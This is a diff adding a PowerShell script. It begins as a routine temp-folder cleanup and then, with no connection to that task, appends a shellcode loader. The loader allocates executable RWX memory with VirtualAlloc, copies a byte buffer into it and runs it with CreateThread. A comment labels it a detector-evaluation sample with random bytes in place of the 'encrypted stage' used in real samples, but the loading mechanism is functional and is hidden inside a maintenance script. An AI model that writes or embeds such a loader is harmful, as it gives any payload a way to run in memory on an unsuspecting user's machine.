@@ -1,0 +1,135 @@
+
+$TempRoot = $env:TEMP
+$AgeDays = 3
+$MinSizeMB = 1
+$LogPath = 'C:\Logs\temp-cleanup-2024-10-28.log'
+$DryRun = $false
+
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
+if (-not (Test-Path -LiteralPath $TempRoot)) {
+    throw ("Temp path not found: {0}" -f $TempRoot)
+}
+$cutoff = (Get-Date).AddDays(-$AgeDays)
+$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
+$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+$stale = $allFiles | Where-Object {
+    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
+}
+$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+
+Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan
+
+foreach ($file in $stale) {
+    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+        continue
+    }
+    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+}
+$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
+    Measure-Object -Property Length -Sum).Sum / 1MB, 1)
+
+Write-Host ("After cleanup: {0} MB" -f $remainingMB) -ForegroundColor Green
+$line = "{0} reclaimed {1} MB from {2} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $reclaimMB, @($stale).Count
+Add-Content -Path $LogPath -Value $line -Encoding UTF8
+
+$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
+    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
+foreach ($dir in $emptyDirs) {
+    if ($dir.LastWriteTime -lt $cutoff) {
+        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+    }
+}
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+try {
+    $NativeCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class NativeMethods
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+            uint dwFreeType);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+    "@
+
+    Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
+    $Buffer = [Byte[]] @(
+        0x41, 0xfc, 0x59, 0x0d, 0x5f, 0x02, 0xe8, 0x30, 0xc4, 0x3d, 0x4f, 0x6d, 0xde, 0xd7, 0x6d, 0x9a,
+        0x10, 0xdd, 0xd2, 0x77, 0xc4, 0x35, 0x84, 0x26, 0xaa, 0x50, 0xe4, 0xab, 0xe6, 0x23, 0x54, 0x7e,
+        0xdd, 0xed, 0x31, 0x54, 0x99, 0x14, 0x48, 0x47, 0x21, 0x0f, 0xec, 0x76, 0xb5, 0xd3, 0xb3, 0x26,
+        0x67, 0xba, 0xd1, 0x52, 0xca, 0xf2, 0x40, 0x17, 0x17, 0x02, 0x73, 0x5a, 0xec, 0x01, 0xd9, 0x6b,
+        0xad, 0x87, 0x28, 0xf4, 0x0e, 0xd3, 0x66, 0x4f, 0x0b, 0x38, 0x19, 0x51, 0x43, 0xea, 0xd1, 0xd7,
+        0x19, 0x3e, 0x22, 0xd4, 0x49, 0x27, 0x68, 0x31, 0xb9, 0x75, 0x66, 0xed, 0x03, 0x72, 0x83, 0x0a,
+        0xdb, 0xfa, 0x20, 0x26, 0xb5, 0xe6, 0xd2, 0xfd, 0x34, 0x7e, 0x5d, 0x39, 0x55, 0xa7, 0xcf, 0x99,
+        0xaf, 0x71, 0x0f, 0xd2, 0x81, 0xc9, 0x6c, 0x9e, 0x0a, 0x78, 0x8d, 0x1a, 0x8f, 0x95, 0x41, 0xd6,
+        0x45, 0xad, 0xf4, 0x14, 0xb9, 0x81, 0xd2, 0xa2, 0x76, 0x48, 0xe6, 0x7e, 0xe1, 0x85, 0x5f, 0x5c,
+        0x0e, 0xe5, 0xb9, 0x9b, 0x08, 0xe8, 0x54, 0xdd, 0x48, 0xe9, 0x8b, 0x1b, 0x96, 0xb1, 0xc6, 0x18,
+        0x52, 0xee, 0xb4, 0x20, 0xc6, 0x66, 0xb0, 0x49, 0x6f, 0xee, 0xa1, 0xb3, 0x95, 0x1f, 0xb0, 0x26,
+        0xf2, 0x5c, 0xe9, 0xd8, 0x15, 0xff, 0xd4, 0xd0, 0x58, 0x58, 0x3a, 0xbf, 0x01, 0x38, 0xf7, 0x10,
+        0xea, 0xb3, 0x48, 0xef, 0xab, 0x57, 0x71, 0x85, 0x02, 0x29, 0x20, 0x79, 0x1b, 0x5e, 0x43, 0x48,
+        0x72, 0x1e, 0xec, 0x5f, 0x52, 0x5c, 0xcb, 0x56, 0x78, 0x86, 0xbe, 0x61, 0x29, 0x04, 0xcc, 0x82,
+        0xe4, 0xa5, 0x77, 0xfb, 0x53, 0x21, 0x16, 0x68
+    )
+
+    $HProcess = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+    if ($HProcess -eq [IntPtr]::Zero) {
+        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        return
+    }
+
+    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
+    $ThreadId = 0
+    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
+    [void][NativeMethods]::WaitForSingleObject($Thread, 4368)
+    [void][NativeMethods]::CloseHandle($Thread)
+
+    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+}
+catch {
+    Write-Warning "loader failed: $($_.Exception.Message)"
+}
